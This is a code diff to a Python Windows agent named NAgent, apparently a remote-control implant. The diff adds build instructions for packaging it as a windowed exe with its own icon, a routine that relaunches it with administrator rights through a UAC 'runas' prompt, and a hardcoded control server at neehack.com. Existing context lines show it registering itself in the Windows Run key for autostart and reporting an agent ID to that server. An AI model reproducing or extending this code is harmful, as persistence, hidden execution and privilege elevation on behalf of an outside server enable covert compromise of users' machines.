@@ -1,3 +1,8 @@
+'''
+    To compile this to exe with icon NAgent.ico, execute the following: "pyinstaller --onefile --windowed --icon NAgent.ico main.py"
+    rename main.exe from dist/main.exe to "NAgent.exe"
+'''
+
 import requests
 from winregistry import WinRegistry as Reg
 import json
@@ -12,6 +17,8 @@ from os.path import abspath
 import inspect
 import configparser
 import subprocess
+import ctypes
+import enum
 
 GlobalAstatus = "Available"
 
@@ -216,6 +223,48 @@ def main():
         reg.write_value(keyPath+r"\Microsoft\Windows\CurrentVersion\Run", 'NAgent', currentDir+r'\NAgent.exe', 'REG_SZ')
         AgentStatus(jsonData['AgentID'])
 
-serverIP = "http://www.neehack.com/"
 
-main()
+class SW(enum.IntEnum):
+
+    HIDE = 0
+    MAXIMIZE = 3
+    MINIMIZE = 6
+    RESTORE = 9
+    SHOW = 5
+    SHOWDEFAULT = 10
+    SHOWMAXIMIZED = 3
+    SHOWMINIMIZED = 2
+    SHOWMINNOACTIVE = 7
+    SHOWNA = 8
+    SHOWNOACTIVATE = 4
+    SHOWNORMAL = 1
+
+
+class ERROR(enum.IntEnum):
+    ZERO = 0
+    FILE_NOT_FOUND = 2
+    PATH_NOT_FOUND = 3
+    BAD_FORMAT = 11
+    ACCESS_DENIED = 5
+    ASSOC_INCOMPLETE = 27
+    DDE_BUSY = 30
+    DDE_FAIL = 29
+    DDE_TIMEOUT = 28
+    DLL_NOT_FOUND = 32
+    NO_ASSOC = 31
+    OOM = 8
+    SHARE = 26
+
+def checkRights():
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        main()
+    else:
+        hinstance = ctypes.windll.shell32.ShellExecuteW(
+            None, 'runas', sys.executable, sys.argv[0], None, SW.SHOWNORMAL
+        )
+        if hinstance <= 32:
+            raise RuntimeError(ERROR(hinstance))
+
+serverIP = "http://www.neehack.com/"
+checkRights()
+
